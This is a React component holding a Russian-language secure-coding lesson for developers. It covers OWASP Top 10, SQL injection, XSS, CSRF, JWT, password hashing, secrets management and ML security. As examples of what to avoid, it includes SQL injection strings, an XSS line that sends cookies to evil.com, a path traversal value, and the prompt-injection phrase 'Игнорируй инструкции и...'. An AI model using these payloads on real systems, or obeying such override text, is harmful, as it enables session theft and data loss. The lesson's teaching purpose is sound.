import { TheoryTable, TheoryCode } from './components/TheoryTable'

const Pill = ({ children, color = 'var(--accent-lime)' }) => (
  <span style={{
    display: 'inline-block', padding: '2px 8px', borderRadius: 5, fontSize: 11, fontWeight: 700,
    background: color + '22', color, borderWidth: 1, borderStyle: 'solid', borderColor: color,
    marginRight: 4, whiteSpace: 'nowrap',
  }}>{children}</span>
)

const Who = ({ roles }) => (
  <div style={{ marginBottom: 12, display: 'flex', flexWrap: 'wrap', gap: 4 }}>
    <span style={{ fontSize: 11, color: 'var(--text-tertiary)', marginRight: 4, lineHeight: '22px' }}>Актуально для:</span>
    {roles.map(r => {
      const colors = {
        'Фронтенд': '#58a6ff', 'Бэкенд': 'var(--accent-lime)', 'Аналитик': '#d29922',
        'Кибербез': '#f85149', 'ML': '#a371f7',
      }
      return <Pill key={r} color={colors[r] || 'var(--text-secondary)'}>{r}</Pill>
    })}
  </div>
)

const Tip = ({ type = 'good', children }) => (
  <div style={{
    background: type === 'good' ? 'rgba(63,185,80,0.08)' : type === 'bad' ? 'rgba(248,81,73,0.08)' : 'rgba(210,153,34,0.08)',
    borderLeft: `3px solid ${type === 'good' ? '#3fb950' : type === 'bad' ? '#f85149' : '#d29922'}`,
    borderRadius: '0 8px 8px 0', padding: '10px 14px', margin: '10px 0',
    fontSize: 13, color: 'var(--text-secondary)',
  }}>
    <strong style={{ color: type === 'good' ? '#3fb950' : type === 'bad' ? '#f85149' : '#d29922' }}>
      {type === 'good' ? '✅ ' : type === 'bad' ? '❌ ' : '⚠️ '}
    </strong>
    {children}
  </div>
)

export default function Day25SecurityTheory() {
  return (
    <div className="theory-container">
      <section className="theory-section">
        <h1 className="theory-title">День 24</h1>
        <p className="theory-subtitle">Кибербезопасность для разработчика</p>
        <p className="theory-date">24 июня 2026</p>
      </section>

      <section className="theory-section">
        <p className="theory-intro">
          Безопасность — не отдельная специальность, а навык каждого разработчика.
          SQL-инъекция в коде бэкендера, утечка токена во фронтенде, незащищённый датасет у аналитика,
          adversarial attack на модель ML — всё это дыры, которые можно было закрыть
          при написании кода. Сегодня разберём то, что актуально для всех треков.
        </p>
      </section>

      {/* ─── 1. Threat model ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">1. Модель угроз: кто и зачем атакует</h2>
        <Who roles={['Фронтенд','Бэкенд','Аналитик','Кибербез','ML']} />
        <p>
          Прежде чем защищаться, нужно понять от кого. Три главных вопроса модели угроз:
        </p>
        <TheoryTable
          headers={['Кто атакует', 'Мотив', 'Метод']}
          rows={[
            ['Script kiddie', 'Интерес / слава', 'Готовые эксплойты, сканеры'],
            ['Хактивист', 'Идеология', 'DDoS, дефейс сайтов'],
            ['Киберпреступник', 'Деньги', 'Ransomware, кража данных, фишинг'],
            ['Инсайдер', 'Обида / деньги', 'Утечка данных, саботаж'],
            ['APT (государство)', 'Шпионаж / диверсия', 'Целевые атаки, zero-day'],
          ]}
        />
        <p>
          Фреймворк <strong>STRIDE</strong> помогает систематически думать об угрозах:
          Spoofing (подмена личности), Tampering (изменение данных), Repudiation (отказ от действий),
          Information disclosure (утечка), Denial of service (отказ в обслуживании),
          Elevation of privilege (повышение привилегий).
        </p>
        <Tip type="warn">Правило 1: Думай как атакующий. Для каждой функции спрашивай — «как это можно сломать?»</Tip>
      </section>

      {/* ─── 2. OWASP Top 10 ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">2. OWASP Top 10 — главные уязвимости веба</h2>
        <Who roles={['Фронтенд','Бэкенд','Кибербез']} />
        <p>
          OWASP (Open Web Application Security Project) ежегодно публикует топ-10 критичных уязвимостей.
          Знание этого списка — базовый стандарт для любого разработчика.
        </p>
        <TheoryTable
          headers={['#', 'Уязвимость', 'Суть']}
          rows={[
            ['A01', 'Broken Access Control', 'Пользователь делает то, что не должен (чужие данные, admin-функции)'],
            ['A02', 'Cryptographic Failures', 'Слабое шифрование, MD5 для паролей, HTTP вместо HTTPS'],
            ['A03', 'Injection', 'SQL, NoSQL, LDAP, OS — ввод пользователя выполняется как команда'],
            ['A04', 'Insecure Design', 'Архитектурные дыры — нет rate limiting, нет проверок на бизнес-логику'],
            ['A05', 'Security Misconfiguration', 'Дефолтные пароли, открытые S3-бакеты, verbose error messages'],
            ['A06', 'Vulnerable Components', 'npm/pip зависимости с известными CVE'],
            ['A07', 'Auth & Session Failures', 'Слабые пароли, нет 2FA, не протухают токены'],
            ['A08', 'Integrity Failures', 'Untrusted deserialization, нет проверки подписей CI/CD'],
            ['A09', 'Logging & Monitoring Failures', 'Атаку не замечают часами/днями'],
            ['A10', 'SSRF', 'Сервер делает запрос к внутренним ресурсам по URL от пользователя'],
          ]}
        />
      </section>

      {/* ─── 3. SQL Injection ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">3. SQL-инъекции</h2>
        <Who roles={['Бэкенд','Аналитик','Кибербез']} />
        <p>
          Классика и до сих пор в топе. Происходит когда пользовательский ввод конкатенируется
          в SQL-строку вместо передачи как параметр. Атакующий вводит SQL-код и меняет логику запроса.
        </p>
        <TheoryCode language="python" code={`# ❌ Уязвимо — строковая конкатенация
username = request.form.get("username")  # вводит: ' OR '1'='1' --
query = f"SELECT * FROM users WHERE name = '{username}'"
# Выполняется: SELECT * FROM users WHERE name = '' OR '1'='1' --'
# Результат: возвращает ВСЕХ пользователей → обход авторизации

# ❌ Ещё хуже — дроп таблицы
# username = "'; DROP TABLE users; --"

# ✅ Параметризованные запросы (защита)
cursor.execute("SELECT * FROM users WHERE name = %s", (username,))

# ✅ ORM тоже безопасен (SQLAlchemy, Django ORM)
User.query.filter_by(name=username).first()

# ✅ Whitelist валидация для динамических имён колонок
allowed_columns = {'name', 'email', 'created_at'}
if sort_by not in allowed_columns:
    raise ValueError("Invalid column")`} />
        <Tip type="bad">Никогда не подставляй пользовательский ввод прямо в SQL-строку — ни через f-string, ни через format().</Tip>
        <Tip type="good">Параметризованные запросы — единственно верный подход. ORM делает это автоматически.</Tip>
      </section>

      {/* ─── 4. XSS ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">4. XSS — Cross-Site Scripting</h2>
        <Who roles={['Фронтенд','Бэкенд','Кибербез']} />
        <p>
          Атакующий внедряет JavaScript в страницу, которую видят другие пользователи.
          Скрипт выполняется в их браузере: крадёт cookies, перехватывает формы, делает запросы от их имени.
          Три вида: <strong>Stored</strong> (сохранён в БД), <strong>Reflected</strong> (в URL),
          <strong>DOM-based</strong> (через JS без сервера).
        </p>
        <TheoryCode language="html" code={`<!-- ❌ Stored XSS: атакующий сохраняет в комментарии -->
<script>document.location='https://evil.com?c='+document.cookie</script>

<!-- ❌ Reflected XSS: через URL-параметр -->
<!-- https://site.com/search?q=<script>alert(1)</script> -->

<!-- ✅ React автоматически экранирует JSX-выражения -->
<div>{userInput}</div>  {/* безопасно: & < > " ' экранируются */}

<!-- ❌ Опасно: dangerouslySetInnerHTML без санитизации -->
<div dangerouslySetInnerHTML={{ __html: userInput }} />

<!-- ✅ С санитизацией через DOMPurify -->
import DOMPurify from 'dompurify'
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />`} />
        <TheoryCode language="python" code={`# ✅ Backend: экранирование в шаблонах
# Jinja2 автоматически экранирует: {{ user_input }}
# Для отключения (только для trusted контента): {{ user_input | safe }}

# ✅ Content Security Policy (CSP) — второй рубеж обороны
# HTTP-заголовок, запрещает inline-скрипты и внешние источники
response.headers['Content-Security-Policy'] = (
    "default-src 'self'; "
    "script-src 'self' https://cdn.trusted.com; "
    "style-src 'self' 'unsafe-inline'"
)`} />
        <Tip type="good">React, Vue, Angular по умолчанию экранируют вывод. Главная опасность — innerHTML и v-html без фильтрации.</Tip>
      </section>

      {/* ─── 5. CSRF ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">5. CSRF — Подделка межсайтовых запросов</h2>
        <Who roles={['Фронтенд','Бэкенд','Кибербез']} />
        <p>
          Пользователь залогинен на bank.ru. Открывает evil.ru, на котором спрятана форма,
          отправляющая POST на bank.ru/transfer. Браузер автоматически добавляет cookies — банк
          считает запрос легитимным. Деньги уходят.
        </p>
        <TheoryCode language="python" code={`# ❌ Уязвимый endpoint — принимает любой POST
@app.route('/transfer', methods=['POST'])
def transfer():
    amount = request.form['amount']
    to = request.form['to']
    do_transfer(amount, to)  # опасно!

# ✅ CSRF-токен: уникальная строка, известная только клиенту и серверу
# Django: {% csrf_token %} в каждой форме — автоматически
# Flask-WTF: form.hidden_tag() — автоматически

# ✅ SameSite Cookie — современная защита
response.set_cookie('session', token,
    samesite='Strict',  # или 'Lax'
    httponly=True,
    secure=True,
)

# ✅ Проверка Origin/Referer заголовка
origin = request.headers.get('Origin')
if origin != 'https://bank.ru':
    abort(403)`} />
        <Tip type="warn">CSRF-токены и SameSite cookies — обязательны для любых форм с изменяющими действиями (POST, PUT, DELETE).</Tip>
      </section>

      {/* ─── 6. Auth & JWT ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">6. Аутентификация, сессии и JWT</h2>
        <Who roles={['Фронтенд','Бэкенд','Кибербез']} />
        <p>
          <strong>Аутентификация</strong> — кто ты? <strong>Авторизация</strong> — что тебе можно?
          Путаница между ними приводит к уязвимостям: пользователь аутентифицирован, но получает
          доступ к чужим данным.
        </p>
        <TheoryCode language="python" code={`import jwt, datetime

SECRET = "must-be-long-and-random"  # минимум 256 бит

# ✅ Выпуск JWT токена
def create_token(user_id: int) -> str:
    payload = {
        'sub': user_id,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1),
        'iat': datetime.datetime.utcnow(),
    }
    return jwt.encode(payload, SECRET, algorithm='HS256')

# ✅ Валидация JWT
def verify_token(token: str) -> dict:
    try:
        return jwt.decode(token, SECRET, algorithms=['HS256'])
    except jwt.ExpiredSignatureError:
        raise Exception("Токен устарел")
    except jwt.InvalidTokenError:
        raise Exception("Невалидный токен")

# ❌ НЕ храни JWT в localStorage — XSS украдёт его
# ✅ Храни в httpOnly cookie — JS не может прочитать

# ❌ НЕ храни пароли и секреты в payload JWT
# JWT декодируется без ключа! Он не шифрует, только подписывает.
# base64decode("eyJhbGciOiJIUzI1NiJ9") → {"alg":"HS256"}`} />
        <TheoryCode language="python" code={`# ✅ Авторизация через роли (RBAC)
def require_role(*roles):
    def decorator(func):
        def wrapper(*args, **kwargs):
            user = get_current_user()
            if user.role not in roles:
                abort(403)  # Forbidden
            return func(*args, **kwargs)
        return wrapper
    return decorator

@app.route('/admin/users')
@require_role('admin', 'superadmin')
def list_users():
    ...

# ❌ IDOR (Insecure Direct Object Reference) — частая ошибка
# /api/orders/12345 — пользователь меняет ID и читает чужие заказы
# ✅ Всегда проверяй принадлежность ресурса текущему пользователю
def get_order(order_id):
    order = Order.get(order_id)
    if order.user_id != current_user.id:
        abort(403)
    return order`} />
      </section>

      {/* ─── 7. Password hashing ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">7. Хеширование паролей</h2>
        <Who roles={['Бэкенд','Кибербез']} />
        <p>
          Пароли нельзя хранить в открытом виде. Нельзя хранить зашифрованными (если ключ утечёт — всё).
          Нужно хешировать специальными медленными алгоритмами с солью. Медленность — это фича:
          перебор словаря занимает годы, а не часы.
        </p>
        <TheoryTable
          headers={['Алгоритм', 'Безопасность', 'Причина']}
          rows={[
            ['MD5', '❌ Опасен', 'Быстрый, радужные таблицы, GPU взламывает миллиарды/сек'],
            ['SHA-256', '❌ Опасен для паролей', 'Слишком быстрый — не предназначен для паролей'],
            ['bcrypt', '✅ Хорошо', 'Медленный (настраиваемый cost factor), встроенная соль'],
            ['Argon2', '✅ Лучший выбор', 'Победитель Password Hashing Competition 2015, memory-hard'],
            ['scrypt', '✅ Хорошо', 'Memory-hard, сложнее для GPU/ASIC атак'],
          ]}
        />
        <TheoryCode language="python" code={`import bcrypt
from argon2 import PasswordHasher

# ─── bcrypt ───
def hash_password_bcrypt(password: str) -> bytes:
    salt = bcrypt.gensalt(rounds=12)  # cost factor: 2^12 итерации
    return bcrypt.hashpw(password.encode(), salt)

def verify_bcrypt(password: str, hashed: bytes) -> bool:
    return bcrypt.checkpw(password.encode(), hashed)

# ─── Argon2 (рекомендуется для новых проектов) ───
ph = PasswordHasher(time_cost=2, memory_cost=65536, parallelism=2)

def hash_password_argon2(password: str) -> str:
    return ph.hash(password)  # соль генерируется автоматически

def verify_argon2(password: str, hashed: str) -> bool:
    try:
        return ph.verify(hashed, password)
    except Exception:
        return False

# ❌ НЕ делай так никогда
import hashlib
bad_hash = hashlib.md5(password.encode()).hexdigest()`} />
      </section>

      {/* ─── 8. HTTPS & TLS ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">8. HTTPS, TLS и сертификаты</h2>
        <Who roles={['Фронтенд','Бэкенд','Кибербез']} />
        <p>
          TLS (Transport Layer Security) шифрует трафик между браузером и сервером.
          Без него — всё видно «человеку посередине» (MITM): пароли, токены, данные форм.
        </p>
        <ul className="theory-list">
          <li className="theory-list-item">TLS 1.2 — минимальная версия, TLS 1.3 — рекомендуется</li>
          <li className="theory-list-item">Сертификат бесплатно: Let's Encrypt (certbot)</li>
          <li className="theory-list-item">HSTS — браузер всегда использует HTTPS, даже если ввели http://</li>
          <li className="theory-list-item">Mixed content — HTTPS-страница не должна грузить HTTP-ресурсы</li>
        </ul>
        <TheoryCode language="python" code={`# ✅ Flask: редирект на HTTPS
from flask_talisman import Talisman
talisman = Talisman(app, force_https=True)

# ✅ nginx: HSTS + редирект
# server {
#     listen 80;
#     return 301 https://$host$request_uri;  # редирект
# }
# server {
#     listen 443 ssl;
#     add_header Strict-Transport-Security "max-age=31536000" always;
#     ssl_protocols TLSv1.2 TLSv1.3;
#     ssl_ciphers HIGH:!aNULL:!MD5;
# }

# ✅ Куки с флагом Secure — не отправляются по HTTP
response.set_cookie('session', value,
    secure=True,    # только HTTPS
    httponly=True,  # недоступно JS
    samesite='Lax'  # защита от CSRF
)`} />
      </section>

      {/* ─── 9. CORS & CSP ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">9. CORS и Content Security Policy</h2>
        <Who roles={['Фронтенд','Бэкенд']} />
        <p>
          <strong>CORS</strong> (Cross-Origin Resource Sharing) — механизм браузера, контролирующий
          с каких доменов JS может делать fetch-запросы. Настраивается на сервере заголовками.
          <strong>CSP</strong> — заголовок, указывающий браузеру откуда можно грузить ресурсы.
        </p>
        <TheoryCode language="python" code={`# ─── CORS: Flask ───
from flask_cors import CORS

# ❌ Открытый CORS — принимает запросы с любого домена
CORS(app)  # origins="*" — опасно для API с аутентификацией

# ✅ Whitelist разрешённых доменов
CORS(app, resources={
    r"/api/*": {
        "origins": ["https://myapp.com", "https://staging.myapp.com"],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Content-Type", "Authorization"],
    }
})

# ─── CSP: защита от XSS на уровне браузера ───
csp = {
    'default-src': "'self'",
    'script-src': ["'self'", "https://cdn.jsdelivr.net"],
    'style-src': ["'self'", "'unsafe-inline'"],
    'img-src': ["'self'", "data:", "https:"],
    'connect-src': ["'self'", "https://api.myapp.com"],
    'frame-ancestors': "'none'",  # защита от Clickjacking
}
# Добавь заголовок X-Frame-Options: DENY тоже`} />
      </section>

      {/* ─── 10. Secrets management ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">10. Управление секретами</h2>
        <Who roles={['Фронтенд','Бэкенд','Аналитик','ML']} />
        <p>
          Самая частая ошибка junior-разработчиков — закомитить API-ключ или пароль в git.
          Раз попав в историю, секрет считается скомпрометированным навсегда
          (даже если ты удалил файл в следующем коммите).
        </p>
        <TheoryCode language="python" code={`# ❌ Никогда не хардкодь секреты
DB_PASSWORD = "super_secret_123"
OPENAI_API_KEY = "sk-proj-abc..."
JWT_SECRET = "mysecret"

# ✅ Переменные окружения через .env
# Файл .env (добавь в .gitignore!)
# DB_PASSWORD=super_secret_123
# OPENAI_API_KEY=sk-proj-abc...

import os
from dotenv import load_dotenv
load_dotenv()

DB_PASSWORD = os.getenv("DB_PASSWORD")
if not DB_PASSWORD:
    raise RuntimeError("DB_PASSWORD not set!")

# ✅ Для продакшена: Vault, AWS Secrets Manager, K8s Secrets
# Секреты инжектируются как env-переменные, не хранятся в коде

# ✅ Проверь, не утекли ли уже секреты
# git log --all -S "sk-proj" --source  ← поиск по истории
# Инструменты: truffleHog, git-secrets, GitGuardian`} />
        <Tip type="bad">Если секрет попал в git — немедленно отзови его в сервисе (rotate key), даже если репо приватное.</Tip>
      </section>

      {/* ─── 11. Input validation ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">11. Валидация входных данных</h2>
        <Who roles={['Бэкенд','Аналитик','Кибербез']} />
        <p>
          Главный принцип: <strong>никогда не доверяй клиенту</strong>. Всё что пришло снаружи
          (HTTP-запросы, файлы, URL-параметры, заголовки) — потенциально враждебные данные.
          Валидация на фронтенде — только UX, не безопасность.
        </p>
        <TheoryCode language="python" code={`from pydantic import BaseModel, EmailStr, constr, validator
import re

# ✅ Pydantic — валидация с типами
class UserCreateRequest(BaseModel):
    username: constr(min_length=3, max_length=30, pattern=r'^[a-zA-Z0-9_]+$')
    email: EmailStr
    age: int

    @validator('age')
    def age_must_be_valid(cls, v):
        if not (0 < v < 150):
            raise ValueError('Invalid age')
        return v

# ✅ Безопасная работа с файлами
import os
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'pdf'}

def allowed_file(filename):
    return ('.' in filename and
            filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS)

def save_upload(file):
    filename = secure_filename(file.filename)  # убирает path traversal: ../../../etc/passwd
    if not allowed_file(filename):
        raise ValueError("Недопустимый тип файла")
    file.save(os.path.join(UPLOAD_FOLDER, filename))

# ❌ Path traversal атака
# filename = "../../../../etc/passwd" → читает системные файлы
# secure_filename() → "etc_passwd" (безопасно)`} />
      </section>

      {/* ─── 12. Для аналитиков ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">12. Безопасность данных для аналитиков</h2>
        <Who roles={['Аналитик','ML']} />
        <p>
          Аналитики работают с реальными данными пользователей — это накладывает строгие
          обязательства. GDPR (в Европе), ФЗ-152 (в России) требуют защиты персональных данных.
          Утечка датасета — юридическая и репутационная катастрофа.
        </p>
        <TheoryCode language="python" code={`import pandas as pd
import hashlib

# ✅ Псевдонимизация (замена PII на хеши)
def pseudonymize(df, columns):
    """Заменяем персональные данные на детерминированные хеши"""
    result = df.copy()
    for col in columns:
        result[col] = result[col].apply(
            lambda x: hashlib.sha256(str(x).encode()).hexdigest()[:16]
        )
    return result

df = pd.DataFrame({'name': ['Иван', 'Мария'], 'email': ['i@mail.ru', 'm@mail.ru'], 'age': [25, 30]})
safe_df = pseudonymize(df, ['name', 'email'])

# ✅ Дифференциальная приватность — добавляем шум к статистикам
import numpy as np

def dp_mean(values, epsilon=1.0, sensitivity=100):
    """Среднее с гарантией дифф. приватности"""
    true_mean = np.mean(values)
    noise = np.random.laplace(0, sensitivity / epsilon)
    return true_mean + noise

# ✅ k-anonymity — каждая запись неотличима от k-1 других
# Проверяй: нельзя идентифицировать человека по комбинации полей

# ❌ Опасные практики аналитика
# - скачать prod-дамп на личный ноутбук
# - отправить файл с ПДн в Telegram/email
# - хранить датасеты в открытом S3-бакете
# - делиться ноутбуками с реальными данными`} />
        <Tip type="warn">Правило минимальных данных (Data Minimization): не собирай и не храни данных больше, чем нужно для задачи.</Tip>
      </section>

      {/* ─── 13. ML security ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">13. Безопасность в Machine Learning</h2>
        <Who roles={['ML','Кибербез']} />
        <p>
          ML-модели — новый вектор атак. Уязвимы не только системы, но и сами модели.
          Четыре главные угрозы:
        </p>
        <TheoryTable
          headers={['Атака', 'Суть', 'Пример']}
          rows={[
            ['Adversarial Examples', 'Специально подобранный шум меняет предсказание', 'Картинка панды → гиббон (99.3% уверенность)'],
            ['Data Poisoning', 'Атакующий загрязняет обучающий датасет', 'Бэкдор: фото с наклейкой → всегда "safe"'],
            ['Model Extraction', 'Восстановление модели через API запросы', 'Воруют коммерческую модель без доступа к весам'],
            ['Prompt Injection', 'Вредоносный промпт меняет поведение LLM', '"Игнорируй инструкции и..."'],
          ]}
        />
        <TheoryCode language="python" code={`# ✅ Защита от adversarial attacks: adversarial training
# При обучении добавляем adversarial примеры в датасет
from art.attacks.evasion import FastGradientMethod
from art.estimators.classification import PyTorchClassifier

classifier = PyTorchClassifier(model=model, ...)
attack = FastGradientMethod(estimator=classifier, eps=0.2)
x_adv = attack.generate(x=x_train)  # генерируем adversarial примеры
# Обучаем на x_train + x_adv

# ✅ Защита от Prompt Injection в LLM-приложениях
def safe_prompt(user_input: str, system_prompt: str) -> str:
    # Разделяй системный промпт и пользовательский ввод
    # Никогда не вставляй user_input напрямую в system_prompt
    return f"""
    <system>{system_prompt}</system>
    <user>{user_input}</user>
    """
    # Валидируй длину и содержание user_input
    # Используй structured outputs где возможно

# ✅ Мониторинг аномалий в предсказаниях
# Резкое изменение распределения → возможная атака или drift
# Логируй входные данные и предсказания для аудита`} />
      </section>

      {/* ─── 14. Rate limiting & DoS ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">14. Rate Limiting и защита от брутфорса</h2>
        <Who roles={['Бэкенд','Кибербез']} />
        <p>
          Брутфорс — перебор паролей. Без ограничений атакующий пробует 1000 паролей в секунду.
          Rate limiting ограничивает количество запросов от одного IP/пользователя.
        </p>
        <TheoryCode language="python" code={`from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

# ✅ Лимит на endpoint логина
@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # 5 попыток в минуту с одного IP
def login():
    ...

# ✅ Прогрессивные задержки + блокировка аккаунта
def check_failed_logins(user_id):
    attempts = get_failed_attempts(user_id)
    if attempts >= 10:
        lock_account(user_id, duration_minutes=30)
        raise Exception("Аккаунт временно заблокирован")
    if attempts >= 5:
        time.sleep(2 ** (attempts - 5))  # 1, 2, 4, 8, 16 секунд

# ✅ CAPTCHA после N неудачных попыток
# ✅ 2FA (двухфакторная аутентификация) — даже при утечке пароля не войти
import pyotp
totp = pyotp.TOTP(user.totp_secret)
if not totp.verify(user_input_code):
    raise Exception("Неверный 2FA код")`} />
      </section>

      {/* ─── 15. Dependency security ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">15. Безопасность зависимостей</h2>
        <Who roles={['Фронтенд','Бэкенд','ML']} />
        <p>
          Современный проект содержит сотни зависимостей. Каждая — потенциальная уязвимость.
          Знаменитый случай: log4shell (2021) затронул половину интернета через одну Java-библиотеку.
        </p>
        <TheoryCode language="bash" code={`# ✅ Аудит зависимостей
npm audit                     # Node.js — покажет CVE в зависимостях
npm audit fix                 # автоматическое исправление

pip-audit                     # Python аналог
pip install pip-audit && pip-audit

# ✅ Проверка на известные уязвимости
safety check                  # проверяет pip зависимости
bandit -r src/                # статический анализ Python кода на уязвимости

# ✅ Pinning версий — предотвращает supply chain атаки
# requirements.txt: фиксируй точные версии с хешами
pip freeze > requirements.txt
pip install --require-hashes -r requirements.txt

# ✅ Автоматический мониторинг: Dependabot (GitHub), Snyk, Renovate
# Они создают PR при появлении новых CVE в зависимостях

# ❌ Опасно: устанавливать пакеты без проверки
# Typosquatting: "reqeusts" вместо "requests" — малварь!`} />
      </section>

      {/* ─── 16. Security checklist ─── */}
      <section className="theory-section">
        <h2 className="theory-heading-2">Чеклист безопасного кода</h2>
        <Who roles={['Фронтенд','Бэкенд','Аналитик','Кибербез','ML']} />
        <TheoryTable
          headers={['Категория', 'Проверь']}
          rows={[
            ['Ввод', 'Всё из вне валидируется и санитизируется'],
            ['Аутентификация', 'Пароли через bcrypt/Argon2, JWT с exp, httpOnly cookies'],
            ['Авторизация', 'Проверка прав на каждый endpoint, защита от IDOR'],
            ['Данные', 'ПДн псевдонимизированы, нет датасетов в открытом доступе'],
            ['Зависимости', 'npm audit / pip-audit запущен, нет критичных CVE'],
            ['Секреты', 'Нет ключей в коде, .env в .gitignore, ключи ротируются'],
            ['Транспорт', 'HTTPS + HSTS, TLS 1.2+, Secure cookies'],
            ['Заголовки', 'CSP, X-Frame-Options, X-Content-Type-Options настроены'],
            ['Логи', 'Ошибки логируются, пароли и токены НЕ логируются'],
            ['Зависимости', 'Версии зафиксированы, автоматический аудит включён'],
          ]}
        />
      </section>

      <section className="theory-section theory-section--closing">
        <p className="theory-closing-text">Security — это не параноя, это профессионализм. Встраивай защиту в код с первого дня.</p>
      </section>
    </div>
  )
}
